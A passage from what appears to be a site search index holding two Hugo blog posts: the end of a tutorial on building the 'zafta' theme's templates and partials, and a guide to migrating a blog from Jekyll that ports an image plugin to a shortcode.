/Users/quoha/Sites/zafta/themes/zafta/archetypes/post.md INFO: 2014/09/29 creating /Users/quoha/Sites/zafta/content/post/first.md /Users/quoha/Sites/zafta/content/post/first.md created $ hugo --verbose new post/second.md INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml INFO: 2014/09/29 attempting to create post/second.md of post INFO: 2014/09/29 curpath: /Users/quoha/Sites/zafta/themes/zafta/archetypes/post.md INFO: 2014/09/29 creating /Users/quoha/Sites/zafta/content/post/second.md /Users/quoha/Sites/zafta/content/post/second.md created $ ls -l content/post total 16 -rw-r--r-- 1 quoha staff 104 Sep 29 21:54 first.md -rw-r--r-- 1 quoha staff 105 Sep 29 21:57 second.md $ cat content/post/first.md +++ Categories = [] Description = \u0026#34;\u0026#34; Tags = [] date = \u0026#34;2014-09-29T21:54:53-05:00\u0026#34; title = \u0026#34;first\u0026#34; +++ my first post $ cat content/post/second.md +++ Categories = [] Description = \u0026#34;\u0026#34; Tags = [] date = \u0026#34;2014-09-29T21:57:09-05:00\u0026#34; title = \u0026#34;second\u0026#34; +++ my second post $ Build the web site and then verify the results.\n$ rm -rf public $ hugo --verbose INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/themes/zafta/static/ to /Users/quoha/Sites/zafta/public/ INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/ INFO: 2014/09/29 found taxonomies: map[string]string{\u0026#34;category\u0026#34;:\u0026#34;categories\u0026#34;, \u0026#34;tag\u0026#34;:\u0026#34;tags\u0026#34;} WARN: 2014/09/29 Unable to locate layout: [404.html theme/404.html] 0 draft content 0 future content 2 pages created 0 tags created 0 categories created in 4 ms $ The output says that it created 2 pages. Those are our new posts:\n$ find public -type f -name \u0026#39;*.html\u0026#39; | xargs ls -l -rw-r--r-- 1 quoha staff 78 Sep 29 22:13 public/index.html -rw-r--r-- 1 quoha staff 0 Sep 29 22:13 public/post/first/index.html -rw-r--r-- 1 quoha staff 0 Sep 29 22:13 public/post/index.html -rw-r--r-- 1 quoha staff 0 Sep 29 22:13 public/post/second/index.html $ The new files are empty because because the templates used to generate the content are empty. The homepage doesn\u0026rsquo;t show the new content, either. We have to update the templates to add the posts.\nList and Single Templates # In Hugo, we have three major kinds of templates. There\u0026rsquo;s the home page template that we updated previously. It is used only by the home page. We also have \u0026ldquo;single\u0026rdquo; templates which are used to generate output for a single content file. We also have \u0026ldquo;list\u0026rdquo; templates that are used to group multiple pieces of content before generating output.\nGenerally speaking, list templates are named \u0026ldquo;list.html\u0026rdquo; and single templates are named \u0026ldquo;single.html.\u0026rdquo;\nThere are three other types of templates: partials, content views, and terms. We will not go into much detail on these.\nAdd Content to the Homepage # The home page will contain a list of posts. Let\u0026rsquo;s update its template to add the posts that we just created. The logic in the template will run every time we build the site.\n$ vi themes/zafta/layouts/index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; {{ range first 10 .Data.Pages }} \u0026lt;h1\u0026gt;{{ .Title }}\u0026lt;/h1\u0026gt; {{ end }} \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; :wq $ Hugo uses the Go template engine. That engine scans the template files for commands which are enclosed between \u0026ldquo;{{\u0026rdquo; and \u0026ldquo;}}\u0026rdquo;. In our template, the commands are:\nrange .Title end The \u0026ldquo;range\u0026rdquo; command is an iterator. We\u0026rsquo;re going to use it to go through the first ten pages. Every HTML file that Hugo creates is treated as a page, so looping through the list of pages will look at every file that will be created.\nThe \u0026ldquo;.Title\u0026rdquo; command prints the value of the \u0026ldquo;title\u0026rdquo; variable. Hugo pulls it from the front matter in the Markdown file.\nThe \u0026ldquo;end\u0026rdquo; command signals the end of the range iterator. The engine loops back to the top of the iteration when it finds \u0026ldquo;end.\u0026rdquo; Everything between the \u0026ldquo;range\u0026rdquo; and \u0026ldquo;end\u0026rdquo; is evaluated every time the engine goes through the iteration. In this file, that would cause the title from the first ten pages to be output as heading level one.\nIt\u0026rsquo;s helpful to remember that some variables, like .Data, are created before any output files. Hugo loads every content file into the variable and then gives the template a chance to process before creating the HTML files.\nBuild the web site and then verify the results.\n$ rm -rf public $ hugo --verbose INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/themes/zafta/static/ to /Users/quoha/Sites/zafta/public/ INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/ INFO: 2014/09/29 found taxonomies: map[string]string{\u0026#34;tag\u0026#34;:\u0026#34;tags\u0026#34;, \u0026#34;category\u0026#34;:\u0026#34;categories\u0026#34;} WARN: 2014/09/29 Unable to locate layout: [404.html theme/404.html] 0 draft content 0 future content 2 pages created 0 tags created 0 categories created in 4 ms $ find public -type f -name \u0026#39;*.html\u0026#39; | xargs ls -l -rw-r--r-- 1 quoha staff 94 Sep 29 22:23 public/index.html -rw-r--r-- 1 quoha staff 0 Sep 29 22:23 public/post/first/index.html -rw-r--r-- 1 quoha staff 0 Sep 29 22:23 public/post/index.html -rw-r--r-- 1 quoha staff 0 Sep 29 22:23 public/post/second/index.html $ cat public/index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;second\u0026lt;/h1\u0026gt; \u0026lt;h1\u0026gt;first\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; $ Congratulations, the home page shows the title of the two posts. The posts themselves are still empty, but let\u0026rsquo;s take a moment to appreciate what we\u0026rsquo;ve done. Your template now generates output dynamically. Believe it or not, by inserting the range command inside of those curly braces, you\u0026rsquo;ve learned everything you need to know to build a theme. All that\u0026rsquo;s really left is understanding which template will be used to generate each content file and becoming familiar with the commands for the template engine.\nAnd, if that were entirely true, this tutorial would be much shorter. There are a few things to know that will make creating a new template much easier. Don\u0026rsquo;t worry, though, that\u0026rsquo;s all to come.\nAdd Content to the Posts # We\u0026rsquo;re working with posts, which are in the content/post/ directory. That means that their section is \u0026ldquo;post\u0026rdquo; (and if we don\u0026rsquo;t do something weird, their type is also \u0026ldquo;post\u0026rdquo;).\nHugo uses the section and type to find the template file for every piece of content. Hugo will first look for a template file that matches the section or type name. If it can\u0026rsquo;t find one, then it will look in the _default/ directory. There are some twists that we\u0026rsquo;ll cover when we get to categories and tags, but for now we can assume that Hugo will try post/single.html, then _default/single.html.\nNow that we know the search rule, let\u0026rsquo;s see what we actually have available:\n$ find themes/zafta -name single.html | xargs ls -l -rw-r--r-- 1 quoha staff 132 Sep 29 17:31 themes/zafta/layouts/_default/single.html We could create a new template, post/single.html, or change the default. Since we don\u0026rsquo;t know of any other content types, let\u0026rsquo;s start with updating the default.\nRemember, any content that we haven\u0026rsquo;t created a template for will end up using this template. That can be good or bad. Bad because I know that we\u0026rsquo;re going to be adding different types of content and we\u0026rsquo;re going to end up undoing some of the changes we\u0026rsquo;ve made. It\u0026rsquo;s good because we\u0026rsquo;ll be able to see immediate results. It\u0026rsquo;s also good to start here because we can start to build the basic layout for the site. As we add more content types, we\u0026rsquo;ll refactor this file and move logic around. Hugo makes that fairly painless, so we\u0026rsquo;ll accept the cost and proceed.\nPlease see the Hugo documentation on template rendering for all the details on determining which template to use. And, as the docs mention, if you\u0026rsquo;re building a single page application (SPA) web site, you can delete all of the other templates and work with just the default single page. That\u0026rsquo;s a refreshing amount of joy right there.\nUpdate the Template File # $ vi themes/zafta/layouts/_default/single.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;{{ .Title }}\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;{{ .Title }}\u0026lt;/h1\u0026gt; {{ .Content }} \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; :wq $ Build the web site and verify the results.\n$ rm -rf public $ hugo --verbose INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/themes/zafta/static/ to /Users/quoha/Sites/zafta/public/ INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/ INFO: 2014/09/29 found taxonomies: map[string]string{\u0026#34;tag\u0026#34;:\u0026#34;tags\u0026#34;, \u0026#34;category\u0026#34;:\u0026#34;categories\u0026#34;} WARN: 2014/09/29 Unable to locate layout: [404.html theme/404.html] 0 draft content 0 future content 2 pages created 0 tags created 0 categories created in 4 ms $ find public -type f -name \u0026#39;*.html\u0026#39; | xargs ls -l -rw-r--r-- 1 quoha staff 94 Sep 29 22:40 public/index.html -rw-r--r-- 1 quoha staff 125 Sep 29 22:40 public/post/first/index.html -rw-r--r-- 1 quoha staff 0 Sep 29 22:40 public/post/index.html -rw-r--r-- 1 quoha staff 128 Sep 29 22:40 public/post/second/index.html $ cat public/post/first/index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;first\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;first\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;my first post\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; $ cat public/post/second/index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;second\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;second\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;my second post\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; $ Notice that the posts now have content. You can go to localhost:1313/post/first to verify.\nLinking to Content # The posts are on the home page. Let\u0026rsquo;s add a link from there to the post. Since this is the home page, we\u0026rsquo;ll update its template.\n$ vi themes/zafta/layouts/index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; {{ range first 10 .Data.Pages }} \u0026lt;h1\u0026gt;\u0026lt;a href=\u0026#34;{{ .Permalink }}\u0026#34;\u0026gt;{{ .Title }}\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; {{ end }} \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Build the web site and verify the results.\n$ rm -rf public $ hugo --verbose INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/themes/zafta/static/ to /Users/quoha/Sites/zafta/public/ INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/ INFO: 2014/09/29 found taxonomies: map[string]string{\u0026#34;tag\u0026#34;:\u0026#34;tags\u0026#34;, \u0026#34;category\u0026#34;:\u0026#34;categories\u0026#34;} WARN: 2014/09/29 Unable to locate layout: [404.html theme/404.html] 0 draft content 0 future content 2 pages created 0 tags created 0 categories created in 4 ms $ find public -type f -name \u0026#39;*.html\u0026#39; | xargs ls -l -rw-r--r-- 1 quoha staff 149 Sep 29 22:44 public/index.html -rw-r--r-- 1 quoha staff 125 Sep 29 22:44 public/post/first/index.html -rw-r--r-- 1 quoha staff 0 Sep 29 22:44 public/post/index.html -rw-r--r-- 1 quoha staff 128 Sep 29 22:44 public/post/second/index.html $ cat public/index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;a href=\u0026#34;/post/second/\u0026#34;\u0026gt;second\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;a href=\u0026#34;/post/first/\u0026#34;\u0026gt;first\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; $ Create a Post Listing # We have the posts displaying on the home page and on their own page. We also have a file public/post/index.html that is empty. Let\u0026rsquo;s make it show a list of all posts (not just the first ten).\nWe need to decide which template to update. This will be a listing, so it should be a list template. Let\u0026rsquo;s take a quick look and see which list templates are available.\n$ find themes/zafta -name list.html | xargs ls -l -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 themes/zafta/layouts/_default/list.html As with the single post, we have to decide to update _default/list.html or create post/list.html. We still don\u0026rsquo;t have multiple content types, so let\u0026rsquo;s stay consistent and update the default list template.\nCreating Top Level Pages # Let\u0026rsquo;s add an \u0026ldquo;about\u0026rdquo; page and display it at the top level (as opposed to a sub-level like we did with posts).\nThe default in Hugo is to use the directory structure of the content/ directory to guide the location of the generated html in the public/ directory. Let\u0026rsquo;s verify that by creating an \u0026ldquo;about\u0026rdquo; page at the top level:\n$ vi content/about.md +++ title = \u0026#34;about\u0026#34; description = \u0026#34;about this site\u0026#34; date = \u0026#34;2014-09-27\u0026#34; slug = \u0026#34;about time\u0026#34; +++ ## about us i\u0026#39;m speechless :wq Generate the web site and verify the results.\n$ find public -name \u0026#39;*.html\u0026#39; | xargs ls -l -rw-rw-r-- 1 mdhender staff 334 Sep 27 15:08 public/about-time/index.html -rw-rw-r-- 1 mdhender staff 527 Sep 27 15:08 public/index.html -rw-rw-r-- 1 mdhender staff 358 Sep 27 15:08 public/post/first-post/index.html -rw-rw-r-- 1 mdhender staff 0 Sep 27 15:08 public/post/index.html -rw-rw-r-- 1 mdhender staff 342 Sep 27 15:08 public/post/second-post/index.html Notice that the page wasn\u0026rsquo;t created at the top level. It was created in a sub-directory named \u0026lsquo;about-time/\u0026rsquo;. That name came from our slug. Hugo will use the slug to name the generated content. It\u0026rsquo;s a reasonable default, by the way, but we can learn a few things by fighting it for this file.\nOne other thing. Take a look at the home page.\n$ cat public/index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;a href=\u0026#34;http://localhost:1313/post/theme/\u0026#34;\u0026gt;creating a new theme\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;a href=\u0026#34;http://localhost:1313/about-time/\u0026#34;\u0026gt;about\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;a href=\u0026#34;http://localhost:1313/post/second-post/\u0026#34;\u0026gt;second\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;a href=\u0026#34;http://localhost:1313/post/first-post/\u0026#34;\u0026gt;first\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;script\u0026gt;document.write(\u0026#39;\u0026lt;script src=\u0026#34;http://\u0026#39; + (location.host || \u0026#39;localhost\u0026#39;).split(\u0026#39;:\u0026#39;)[0] + \u0026#39;:1313/livereload.js?mindelay=10\u0026#34;\u0026gt;\u0026lt;/\u0026#39; + \u0026#39;script\u0026gt;\u0026#39;)\u0026lt;/script\u0026gt;\u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Notice that the \u0026ldquo;about\u0026rdquo; link is listed with the posts? That\u0026rsquo;s not desirable, so let\u0026rsquo;s change that first.\n$ vi themes/zafta/layouts/index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;posts\u0026lt;/h1\u0026gt; {{ range first 10 .Data.Pages }} {{ if eq .Type \u0026#34;post\u0026#34;}} \u0026lt;h2\u0026gt;\u0026lt;a href=\u0026#34;{{ .Permalink }}\u0026#34;\u0026gt;{{ .Title }}\u0026lt;/a\u0026gt;\u0026lt;/h2\u0026gt; {{ end }} {{ end }} \u0026lt;h1\u0026gt;pages\u0026lt;/h1\u0026gt; {{ range .Data.Pages }} {{ if eq .Type \u0026#34;page\u0026#34; }} \u0026lt;h2\u0026gt;\u0026lt;a href=\u0026#34;{{ .Permalink }}\u0026#34;\u0026gt;{{ .Title }}\u0026lt;/a\u0026gt;\u0026lt;/h2\u0026gt; {{ end }} {{ end }} \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; :wq Generate the web site and verify the results. The home page has two sections, posts and pages, and each section has the right set of headings and links in it.\nBut, that about page still renders to about-time/index.html.\n$ find public -name \u0026#39;*.html\u0026#39; | xargs ls -l -rw-rw-r-- 1 mdhender staff 334 Sep 27 15:33 public/about-time/index.html -rw-rw-r-- 1 mdhender staff 645 Sep 27 15:33 public/index.html -rw-rw-r-- 1 mdhender staff 358 Sep 27 15:33 public/post/first-post/index.html -rw-rw-r-- 1 mdhender staff 0 Sep 27 15:33 public/post/index.html -rw-rw-r-- 1 mdhender staff 342 Sep 27 15:33 public/post/second-post/index.html Knowing that hugo is using the slug to generate the file name, the simplest solution is to change the slug. Let\u0026rsquo;s do it the hard way and change the permalink in the configuration file.\n$ vi config.toml [permalinks] page = \u0026#34;/:title/\u0026#34; about = \u0026#34;/:filename/\u0026#34; Generate the web site and verify that this didn\u0026rsquo;t work. Hugo lets \u0026ldquo;slug\u0026rdquo; or \u0026ldquo;URL\u0026rdquo; override the permalinks setting in the configuration file. Go ahead and comment out the slug in content/about.md, then generate the web site to get it to be created in the right place.\nSharing Templates # If you\u0026rsquo;ve been following along, you probably noticed that posts have titles in the browser and the home page doesn\u0026rsquo;t. That\u0026rsquo;s because we didn\u0026rsquo;t put the title in the home page\u0026rsquo;s template (layouts/index.html). That\u0026rsquo;s an easy thing to do, but let\u0026rsquo;s look at a different option.\nWe can put the common bits into a shared template that\u0026rsquo;s stored in the themes/zafta/layouts/partials/ directory.\nCreate the Header and Footer Partials # In Hugo, a partial is a sugar-coated template. Normally a template reference has a path specified. Partials are different. Hugo searches for them along a TODO defined search path. This makes it easier for end-users to override the theme\u0026rsquo;s presentation.\n$ vi themes/zafta/layouts/partials/header.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;{{ .Title }}\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; :wq $ vi themes/zafta/layouts/partials/footer.html \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; :wq Update the Home Page Template to Use the Partials # The most noticeable difference between a template call and a partials call is the lack of path:\n{{ template \u0026#34;theme/partials/header.html\u0026#34; . }} versus\n{{ partial \u0026#34;header.html\u0026#34; . }} Both pass in the context.\nLet\u0026rsquo;s change the home page template to use these new partials.\n$ vi themes/zafta/layouts/index.html {{ partial \u0026#34;header.html\u0026#34; . }} \u0026lt;h1\u0026gt;posts\u0026lt;/h1\u0026gt; {{ range first 10 .Data.Pages }} {{ if eq .Type \u0026#34;post\u0026#34;}} \u0026lt;h2\u0026gt;\u0026lt;a href=\u0026#34;{{ .Permalink }}\u0026#34;\u0026gt;{{ .Title }}\u0026lt;/a\u0026gt;\u0026lt;/h2\u0026gt; {{ end }} {{ end }} \u0026lt;h1\u0026gt;pages\u0026lt;/h1\u0026gt; {{ range .Data.Pages }} {{ if or (eq .Type \u0026#34;page\u0026#34;) (eq .Type \u0026#34;about\u0026#34;) }} \u0026lt;h2\u0026gt;\u0026lt;a href=\u0026#34;{{ .Permalink }}\u0026#34;\u0026gt;{{ .Type }} - {{ .Title }} - {{ .RelPermalink }}\u0026lt;/a\u0026gt;\u0026lt;/h2\u0026gt; {{ end }} {{ end }} {{ partial \u0026#34;footer.html\u0026#34; . }} :wq Generate the web site and verify the results. The title on the home page is now \u0026ldquo;your title here\u0026rdquo;, which comes from the \u0026ldquo;title\u0026rdquo; variable in the config.toml file.\nUpdate the Default Single Template to Use the Partials # $ vi themes/zafta/layouts/_default/single.html {{ partial \u0026#34;header.html\u0026#34; . }} \u0026lt;h1\u0026gt;{{ .Title }}\u0026lt;/h1\u0026gt; {{ .Content }} {{ partial \u0026#34;footer.html\u0026#34; . }} :wq Generate the web site and verify the results. The title on the posts and the about page should both reflect the value in the markdown file.\nAdd “Date Published” to Posts # It\u0026rsquo;s common to have posts display the date that they were written or published, so let\u0026rsquo;s add that. The front matter of our posts has a variable named \u0026ldquo;date.\u0026rdquo; It\u0026rsquo;s usually the date the content was created, but let\u0026rsquo;s pretend that\u0026rsquo;s the value we want to display.\nAdd “Date Published” to the Template # We\u0026rsquo;ll start by updating the template used to render the posts. The template code will look like:\n{{ .Date.Format \u0026#34;Mon, Jan 2, 2006\u0026#34; }} Posts use the default single template, so we\u0026rsquo;ll change that file.\n$ vi themes/zafta/layouts/_default/single.html {{ partial \u0026#34;header.html\u0026#34; . }} \u0026lt;h1\u0026gt;{{ .Title }}\u0026lt;/h1\u0026gt; \u0026lt;h2\u0026gt;{{ .Date.Format \u0026#34;Mon, Jan 2, 2006\u0026#34; }}\u0026lt;/h2\u0026gt; {{ .Content }} {{ partial \u0026#34;footer.html\u0026#34; . }} :wq Generate the web site and verify the results. The posts now have the date displayed in them. There\u0026rsquo;s a problem, though. The \u0026ldquo;about\u0026rdquo; page also has the date displayed.\nAs usual, there are a couple of ways to make the date display only on posts. We could do an \u0026ldquo;if\u0026rdquo; statement like we did on the home page. Another way would be to create a separate template for posts.\nThe \u0026ldquo;if\u0026rdquo; solution works for sites that have just a couple of content types. It aligns with the principle of \u0026ldquo;code for today,\u0026rdquo; too.\nLet\u0026rsquo;s assume, though, that we\u0026rsquo;ve made our site so complex that we feel we have to create a new template type. In Hugo-speak, we\u0026rsquo;re going to create a section template.\nLet\u0026rsquo;s restore the default single template before we forget.\n$ mkdir themes/zafta/layouts/post $ vi themes/zafta/layouts/_default/single.html {{ partial \u0026#34;header.html\u0026#34; . }} \u0026lt;h1\u0026gt;{{ .Title }}\u0026lt;/h1\u0026gt; {{ .Content }} {{ partial \u0026#34;footer.html\u0026#34; . }} :wq Now we\u0026rsquo;ll update the post\u0026rsquo;s version of the single template. If you remember Hugo\u0026rsquo;s rules, the template engine will use this version over the default.\n$ vi themes/zafta/layouts/post/single.html {{ partial \u0026#34;header.html\u0026#34; . }} \u0026lt;h1\u0026gt;{{ .Title }}\u0026lt;/h1\u0026gt; \u0026lt;h2\u0026gt;{{ .Date.Format \u0026#34;Mon, Jan 2, 2006\u0026#34; }}\u0026lt;/h2\u0026gt; {{ .Content }} {{ partial \u0026#34;footer.html\u0026#34; . }} :wq Note that we removed the date logic from the default template and put it in the post template. Generate the web site and verify the results. Posts have dates and the about page doesn\u0026rsquo;t.\nDon\u0026rsquo;t Repeat Yourself # DRY is a good design goal and Hugo does a great job supporting it. Part of the art of a good template is knowing when to add a new template and when to update an existing one. While you\u0026rsquo;re figuring that out, accept that you\u0026rsquo;ll be doing some refactoring. Hugo makes that easy and fast, so it\u0026rsquo;s okay to delay splitting up a template.\n"},{"id":4,"href":"/posts/migrate-from-jekyll/","title":"Migrating from Jekyll","section":"Blog","content":" Move static content to static # Jekyll has a rule that any directory not starting with _ will be copied as-is to the _site output. Hugo keeps all static content under static. You should therefore move it all there. With Jekyll, something that looked like\n▾ \u0026lt;root\u0026gt;/ ▾ images/ logo.png should become\n▾ \u0026lt;root\u0026gt;/ ▾ static/ ▾ images/ logo.png Additionally, you\u0026rsquo;ll want any files that should reside at the root (such as CNAME) to be moved to static.\nCreate your Hugo configuration file # Hugo can read your configuration as JSON, YAML or TOML. Hugo supports parameters custom configuration too. Refer to the Hugo configuration documentation for details.\nSet your configuration publish folder to _site # The default is for Jekyll to publish to _site and for Hugo to publish to public. If, like me, you have _site mapped to a git submodule on the gh-pages branch, you\u0026rsquo;ll want to do one of two alternatives:\nChange your submodule to point to map gh-pages to public instead of _site (recommended).\ngit submodule deinit _site git rm _site git submodule add -b gh-pages git@github.com:your-username/your-repo.git public Or, change the Hugo configuration to use _site instead of public.\n{ .. \u0026quot;publishdir\u0026quot;: \u0026quot;_site\u0026quot;, .. } Convert Jekyll templates to Hugo templates # That\u0026rsquo;s the bulk of the work right here. The documentation is your friend. You should refer to Jekyll\u0026rsquo;s template documentation if you need to refresh your memory on how you built your blog and Hugo\u0026rsquo;s template to learn Hugo\u0026rsquo;s way.\nAs a single reference data point, converting my templates for heyitsalex.net took me no more than a few hours.\nConvert Jekyll plugins to Hugo shortcodes # Jekyll has plugins; Hugo has shortcodes. It\u0026rsquo;s fairly trivial to do a port.\nImplementation # As an example, I was using a custom image_tag plugin to generate figures with caption when running Jekyll. As I read about shortcodes, I found Hugo had a nice built-in shortcode that does exactly the same thing.\nJekyll\u0026rsquo;s plugin:\nmodule Jekyll class ImageTag \u0026lt; Liquid::Tag @url = nil @caption = nil @class = nil @link = nil // Patterns IMAGE_URL_WITH_CLASS_AND_CAPTION = IMAGE_URL_WITH_CLASS_AND_CAPTION_AND_LINK = /(\\w+)(\\s+)((https?:\\/\\/|\\/)(\\S+))(\\s+)\u0026quot;(.*?)\u0026quot;(\\s+)-\u0026gt;((https?:\\/\\/|\\/)(\\S+))(\\s*)/i IMAGE_URL_WITH_CAPTION = /((https?:\\/\\/|\\/)(\\S+))(\\s+)\u0026quot;(.*?)\u0026quot;/i IMAGE_URL_WITH_CLASS = /(\\w+)(\\s+)((https?:\\/\\/|\\/)(\\S+))/i IMAGE_URL = /((https?:\\/\\/|\\/)(\\S+))/i def initialize(tag_name, markup, tokens) super if markup =~ IMAGE_URL_WITH_CLASS_AND_CAPTION_AND_LINK @class = $1 @url = $3 @caption = $7 @link = $9 elsif markup =~ IMAGE_URL_WITH_CLASS_AND_CAPTION @class = $1 @url = $3 @caption = $7 elsif markup =~ IMAGE_URL_WITH_CAPTION @url = $1 @caption = $5 elsif markup =~ IMAGE_URL_WITH_CLASS @class = $1 @url = $3 elsif markup =~ IMAGE_URL @url = $1 end end def render(context) if @class source = \u0026quot;\u0026lt;figure class='#{@class}'\u0026gt;\u0026quot; else source = \u0026quot;\u0026lt;figure\u0026gt;\u0026quot; end if @link source += \u0026quot;\u0026lt;a href=\\\u0026quot;#{@link}\\\u0026quot;\u0026gt;\u0026quot; end source += \u0026quot;\u0026lt;img src=\\\u0026quot;#{@url}\\\u0026quot;\u0026gt;\u0026quot; if @link source += \u0026quot;\u0026lt;/a\u0026gt;\u0026quot; end source += \u0026quot;\u0026lt;figcaption\u0026gt;#{@caption}\u0026lt;/figcaption\u0026gt;\u0026quot; if @caption source += \u0026quot;\u0026lt;/figure\u0026gt;\u0026quot; source end end end Liquid::Template.register_tag('image', Jekyll::ImageTag) is written as this Hugo shortcode:\n\u0026lt;!-- image --\u0026gt; \u0026lt;figure {{ with .Get \u0026quot;class\u0026quot; }}class=\u0026quot;{{.}}\u0026quot;{{ end }}\u0026gt; {{ with .Get \u0026quot;link\u0026quot;}}\u0026lt;a href=\u0026quot;{{.}}\u0026quot;\u0026gt;{{ end }} \u0026lt;img src=\u0026quot;{{ .Get \u0026quot;src\u0026quot; }}\u0026quot; {{ if or (.Get \u0026quot;alt\u0026quot;) (.Get \u0026quot;caption\u0026quot;) }}alt=\u0026quot;{{ with .Get \u0026quot;alt\u0026quot;}}{{.}}{{else}}{{ .Get \u0026quot;caption\u0026quot; }}{{ end }}\u0026quot;{{ end }} /\u0026gt; {{ if .Get \u0026quot;link\u0026quot;}}\u0026lt;/a\u0026gt;{{ end }} {{ if or (or (.Get \u0026quot;title\u0026quot;) (.Get \u0026quot;caption\u0026quot;)) (.Get \u0026quot;attr\u0026quot;)}} \u0026lt;figcaption\u0026gt;{{ if isset .Params \u0026quot;title\u0026quot; }} {{ .Get \u0026quot;title\u0026quot; }}{{ end }} {{ if or (.Get \u0026quot;caption\u0026quot;) (.Get \u0026quot;attr\u0026quot;)}}\u0026lt;p\u0026gt; {{ .Get \u0026quot;caption\u0026quot; }} {{ with .Get \u0026quot;attrlink\u0026quot;}}\u0026lt;a href=\u0026quot;{{.}}\u0026quot;\u0026gt; {{ end }} {{ .Get \u0026quot;attr\u0026quot; }} {{ if .Get \u0026quot;attrlink\u0026quot;}}\u0026lt;/a\u0026gt; {{ end }} \u0026lt;/p\u0026gt; {{ end }} \u0026lt;/figcaption\u0026gt; {{ end }} \u0026lt;/figure\u0026gt; \u0026lt;!-- image --\u0026gt; Usage # I simply changed:\n{% image full http://farm5.staticflickr.com/4136/4829260124_57712e570a_o_d.jpg \u0026quot;One of my favorite touristy-type photos. I secretly waited for the good light while we were \u0026quot;having fun\u0026quot; and took this. Only regret: a stupid pole in the top-left corner of the frame I had to clumsily get rid of at post-processing.\u0026quot; -\u0026gt;http://www.flickr.com/photos/alexnormand/4829260124/in/set-72157624547713078/ %} to this (this example uses a slightly extended version named fig, different than the built-in figure):\n{{% fig class=\u0026quot;full\u0026quot; src=\u0026quot;http://farm5.staticflickr.com/4136/4829260124_57712e570a_o_d.jpg\u0026quot; title=\u0026quot;One of my favorite touristy-type photos. I secretly waited for the good light while we were having fun and took this. Only regret: a stupid pole in the top-left corner of the frame I had to clumsily get rid of at post-processing.\u0026quot; link=\u0026quot;http://www.flickr.com/photos/alexnormand/4829260124/in/set-72157624547713078/\u0026quot; %}} As a bonus, the shortcode named parameters are, arguably, more readable.\nFinishing touches # Fix content # Depending on the amount of customization that was done with each post with Jekyll, this step will require more or less effort. There are no hard and fast rules here except that hugo server --watch is your friend. Test your changes and fix errors as needed.\nClean up # You\u0026rsquo;ll want to remove the Jekyll configuration at this point. If you have anything else that isn\u0026rsquo;t used, delete it.\nA practical example in a diff # Hey, it\u0026rsquo;s Alex was migrated in less than a father-with-kids day from Jekyll to 